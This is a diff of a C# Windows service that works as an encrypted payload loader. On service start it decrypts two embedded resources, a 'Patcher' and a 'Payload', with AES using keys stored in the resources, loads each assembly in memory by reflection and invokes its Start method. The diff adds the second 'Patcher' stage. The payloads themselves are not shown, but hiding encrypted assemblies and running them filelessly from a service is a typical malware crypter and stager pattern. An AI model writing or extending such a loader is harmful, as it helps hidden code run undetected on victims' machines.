@@ -20,10 +20,37 @@ namespace Service
             InitializeComponent();
         }
 
-        private static RijndaelManaged encoder;
-        private static void InitDecoder()
+
+
+
+
+        protected override void OnStart(string[] args)
         {
-            var secretKey = Properties.Resources.Key;
+            Thread t = new Thread(new ThreadStart(Exec));
+            t.Start();
+
+        }
+
+        public static void Exec()
+        {
+            //System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { "OnStart" });
+            //try
+            //{
+
+            var asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Patcher), Properties.Resources.PatchKey);
+            Execute(asm);
+            asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Payload), Properties.Resources.Key);
+            Execute(asm);
+            //}
+            //catch(Exception ex)
+            //{
+            //    System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { ex.ToString() });
+            //}
+        }
+
+        private static byte[] Decrypt(string b64, string secretKey)
+        {
+            var src = Convert.FromBase64String(b64);
             var bytes = Encoding.UTF8.GetBytes(secretKey);
 
             byte[] key = bytes.Take(32).ToArray();
@@ -36,40 +63,15 @@ namespace Service
             rijndael.IV = iv;
             rijndael.Padding = PaddingMode.PKCS7;
 
-            encoder = rijndael;
-        }
-
-        private static byte[] Decrypt(byte[] src)
-        {
-            byte[] decryptedBytes = encoder.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
+            byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
             return decryptedBytes;
         }
 
-        protected override void OnStart(string[] args)
+        private static void Execute(byte[] assemblyBytes)
         {
-            Thread t = new Thread(new ThreadStart(Execute));
-            t.Start();
-            
-        }
-
-        public static void Execute()
-        {
-            //System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { "OnStart" });
-            //try
-            //{
-
-            InitDecoder();
-            var b64 = Encoding.UTF8.GetString(Properties.Resources.Payload);
-            var asm = Decrypt(Convert.FromBase64String(b64));
-
-            var assembly = Assembly.Load(asm);
+            var assembly = System.Reflection.Assembly.Load(assemblyBytes);
             var method = assembly.GetTypes().First(t => t.Name ==  "Entry").GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
             method.Invoke(null, new object[] { });
-            //}
-            //catch(Exception ex)
-            //{
-            //    System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { ex.ToString() });
-            //}
         }
 
         protected override void OnStop()
